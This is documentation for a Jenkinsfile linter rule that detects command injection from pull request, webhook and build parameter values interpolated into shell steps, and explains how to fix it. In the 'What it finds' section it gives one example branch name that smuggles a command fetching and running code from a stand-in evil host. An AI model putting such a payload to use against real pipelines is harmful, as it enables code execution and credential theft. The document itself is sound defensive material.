# script-injection

A value from outside the pipeline, such as a pull request title or a build
parameter, is interpolated by Groovy into the script of a `sh`, `bat`,
`powershell` or `pwsh` step, or into a command line that Docker Pipeline
runs in a shell.

| Severity | Confidence | Persona |
|---|---|---|
| high: pull requests, webhooks; medium: build parameters | high | regular |

## What it finds

```groovy
sh "git checkout ${env.CHANGE_BRANCH}"   // CHANGE_BRANCH is reported
```

The double quotes make this a Groovy string, so Groovy writes the branch
name into the script before the shell sees it. Whoever opens the pull request
chooses that name, and Git allows a branch named `x;curl${IFS}evil.sh|sh`.
The shell runs it.

It finds the value however it gets there:

- `$X`, `${X}`, `${env.X}`, `${env['X']}`, `${params.X}`
- `${X.trim()}`, `${X.toLowerCase()}`, `${X - 'origin/'}`, `${X ?: 'none'}`,
  and other expressions that keep the text
- `sh 'echo ' + X`, joined with `+`
- `def branch = env.CHANGE_BRANCH`, and later `sh "git push origin ${branch}"`
- an environment variable set from it, with `environment { T = "${env.CHANGE_TITLE}" }`,
  `withEnv(["T=${env.CHANGE_TITLE}"])` or `env.T = env.CHANGE_TITLE`, and
  later interpolated as `${T}` or `${env.T}`
- `sh script: "...", returnStdout: true`, and `"""..."""` strings

The values it knows, and who chooses them:

| Value | Set by | Chosen by |
|---|---|---|
| `CHANGE_TITLE`, `CHANGE_BRANCH`, `CHANGE_AUTHOR_DISPLAY_NAME` | multibranch projects, from any branch source | anyone who opens a pull request |
| `ghprbPullTitle`, `ghprbPullDescription`, `ghprbSourceBranch`, `ghprbCommentBody`, `ghprbActualCommitAuthor`, ... | GitHub Pull Request Builder | anyone who opens a pull request or comments on one |
| `gitlabMergeRequestTitle`, `gitlabMergeRequestDescription`, `gitlabSourceBranch`, `gitlabBranch`, `gitlabUserName`, `gitlabTriggerPhrase` | GitLab plugin | anyone who opens a merge request or comments on one |
| `GERRIT_CHANGE_SUBJECT`, `GERRIT_TOPIC`, `GERRIT_HASHTAGS`, `GERRIT_CHANGE_OWNER_NAME`, `GERRIT_EVENT_ACCOUNT_NAME`, ... | Gerrit Trigger | anyone who can upload a change or comment on one |
| The variables of `GenericTrigger(genericVariables: ..., genericRequestVariables: ..., genericHeaderVariables: ...)`, and the `name_...` variables it makes from JSON objects and lists | Generic Webhook Trigger | whoever sends the webhook |
| `params.X`, and `X` or `env.X` for a parameter the file declares | build parameters | anyone who can start the build |

## Why it matters

The [Jenkins documentation](https://www.jenkins.io/doc/book/pipeline/jenkinsfile/#injection-via-interpolation)
warns about exactly this: Groovy interpolation of untrusted values into a
`sh` step is command injection.

- **A pull request does not need to change the Jenkinsfile.** For a pull
  request from a fork, multibranch projects run the Jenkinsfile of the
  target branch, which the attacker cannot change. Its title and branch
  name still come from the attacker. Injection runs their commands in
  steps the target branch trusts, often with credentials bound, or on an
  agent the pull request's own code never reaches.
- **A webhook token in the Jenkinsfile is not a secret.** Anyone who can
  read the file can call the Generic Webhook Trigger with any payload.
- **Build parameters reach further than the job's configuration.** Anyone
  with permission to start the build chooses them, and so can scripts and
  upstream jobs that trigger it.

Quoting in the script does not help: in `sh "echo '${env.CHANGE_TITLE}'"`, a
title with a `'` in it ends the quotes.

## How to fix it

Read the value from the environment, where Jenkins puts it, in a script in
single quotes, so that Groovy leaves it alone. Then quote it in the shell:

```groovy
sh 'git checkout "$CHANGE_BRANCH"'
```

Build parameters are environment variables too: `sh 'deploy --version "$VERSION"'`.
A value you compute in Groovy goes into the environment with `withEnv`:

```groovy
def slug = env.CHANGE_BRANCH.toLowerCase()
withEnv(["SLUG=${slug}"]) {
    sh 'kubectl create namespace "$SLUG"'
}
```

| Step | Read the value as |
|---|---|
| `sh` | `"$X"`, in double quotes inside the single-quoted Groovy string |
| `powershell`, `pwsh` | `$env:X` |
| `bat` | `!X!`, with `setlocal EnableDelayedExpansion` |
| `docker.build(image, args)`, `run(args, command)`, `withRun(args, command)` | `"$X"`, as for `sh`: Docker Pipeline joins these into a `sh` command line |

`bat` needs delayed expansion because cmd expands `%X%` before it parses the
line, so `&` or `|` in the value still runs.

## How `--fix` fixes it

`jenkinsfilelint --audit --fix` makes this change for you where it is safe.
It puts the script in single quotes and has the shell read each value from
the environment, in double quotes:

```groovy
sh "git checkout ${env.CHANGE_BRANCH}"   // before
sh 'git checkout "$CHANGE_BRANCH"'       // after
```

In `powershell` and `pwsh`, a value becomes `${env:CHANGE_BRANCH}`.

It rewrites a script only when all of these hold, and otherwise leaves the
script and its finding as they are:

- The script is a string in double or triple double quotes, passed straight
  to `sh`, `powershell` or `pwsh`.
- Every placeholder in it reads an environment variable: `$X`, `${X}`,
  `${env.X}`, `${env['X']}` or `${params.X}`, where `X` is a pull request or
  webhook variable, a build parameter, a `withCredentials`, `environment` or
  `withEnv` variable, or one that Jenkins sets in every build, such as
  `BUILD_NUMBER`. A local variable, a method call such as `.trim()` or
  `currentBuild` anywhere in the script keeps all of it as it is.
- The text around the placeholders has no quote, backslash or `$`, so it
  means the same in single quotes. There is no here-document, `[[` or
  `eval`, and no `Invoke-Expression` in PowerShell, where each value must also
  stand alone as an argument.
- No value is where a command goes, as in `sh "${CMD}"`: quoted, a command
  line would become one command name.

`bat` steps, Docker Pipeline command lines and values joined with `+` are
left to you.

Each value is quoted now, so the shell no longer splits it into words: check
a value that holds several arguments on purpose. Before it writes a file,
`--fix` audits the fixed text again, and keeps a fix only if the file still
parses and no new finding appears.

## What it does not report

- **Choice and boolean parameters** the file declares. Jenkins accepts only
  the declared choices, and `true` or `false`. The auditor persona shows
  them.
- **Values made safe for a shell**: `toInteger()` and other conversions,
  `x as Integer`, `URLEncoder.encode(x, 'UTF-8')`, `encodeBase64()`,
  `x.replaceAll(/[^A-Za-z0-9._-]/, '')` with a class of letters, digits and
  `_ - . / : @ , + =`, and `x.replace("'", "'\\''")` inside single quotes.
- **Values that only describe the text**: `x.size()`, `x.contains('wip')`,
  `x == 'main'`, `x ==~ /.../`, and the like.
- **Other steps**, such as `echo`, `writeFile` or `currentBuild.description`:
  they do not run the value.
- **`docker.build("image:${tag}")` and `docker.image(...)`**: Docker Pipeline
  passes the image name in the environment.
- **What a step or method returns**: in `def r = api.lookup(env.CHANGE_TITLE)`,
  `r` is not the title.
- **Values checked before use.** The rule does not follow `if` conditions.
  See [When to ignore it](#when-to-ignore-it).

## Other personas

- **pedantic:**
  - **Email addresses** (`CHANGE_AUTHOR_EMAIL`, `gitlabUserEmail`, ...):
    medium severity, medium confidence. An address can hold shell syntax,
    though few systems let one through.
  - **User names, fork names and repository URLs** (`CHANGE_AUTHOR`,
    `CHANGE_FORK`, `ghprbPullAuthorLogin`, ...): low severity. Their format
    leaves little room for shell syntax.
- **auditor:** also
  - **branch and tag names that only people who can push choose**
    (`BRANCH_NAME`, `TAG_NAME`, `CHANGE_TARGET`, `GIT_BRANCH`, ...);
  - **choice and boolean parameters**;
  - **webhook variables** filtered with a `regexpFilter` like `[^A-Za-z0-9]`,
    or for fields with a fixed format, such as `$.after`, when the webhook
    token is not in the file;
  - **Gerrit's Base64-encoded** `GERRIT_CHANGE_COMMIT_MESSAGE` and
    `GERRIT_EVENT_COMMENT_TEXT`.

A webhook variable is high severity and high confidence when the webhook's
token is written in the file, and medium confidence when it is not: then
what it holds depends on the field the JSONPath selects.

## When to ignore it

When the value is checked before the step, so that it cannot hold shell
syntax:

```groovy
if (!(env.CHANGE_BRANCH ==~ /[A-Za-z0-9._\/-]+/)) {
    error 'Unexpected branch name'
}
// jenkinsfilelint: ignore[script-injection] checked above
sh "git checkout ${env.CHANGE_BRANCH}"
```

Reading the value from the environment is still simpler, and stays safe when
the check changes.

## How precise it is

On 1,756 public Jenkinsfiles from GitHub that use these values, it reports
2,994 findings in 630 files with the regular persona: 1,006 high, from pull
requests and webhooks, and 1,988 medium, from build parameters. In a random
sample of 90, each was a value from these sources that reached a shell
unescaped. Whether it can be exploited depends on who can open pull
requests, send the webhook or start the build.

## References

- Jenkins: [Injection via interpolation](https://www.jenkins.io/doc/book/pipeline/jenkinsfile/#injection-via-interpolation)
- Jenkins: [Using environment variables](https://www.jenkins.io/doc/book/pipeline/jenkinsfile/#using-environment-variables)
- Jenkins: [Handling parameters](https://www.jenkins.io/doc/book/pipeline/jenkinsfile/#handling-parameters)
- zizmor: [template-injection](https://docs.zizmor.sh/audits/#template-injection),
  the same problem in GitHub Actions
